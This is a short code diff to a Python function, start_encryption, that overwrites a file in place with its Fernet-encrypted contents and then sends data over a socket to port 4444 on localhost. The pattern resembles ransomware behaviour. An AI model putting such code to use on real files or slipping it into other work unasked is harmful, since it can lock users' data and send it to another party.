@@ -20,6 +20,10 @@ def start_encryption(filepath):
 
     data = encrypt_file(filepath, fernet)
 
+    with open(filepath, 'wb') as file:
+        file.write(data)
+        print(f"Encrypted data written to {filepath}")
+
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(('localhost', 4444))
     print("Connected to server. Sending data...")
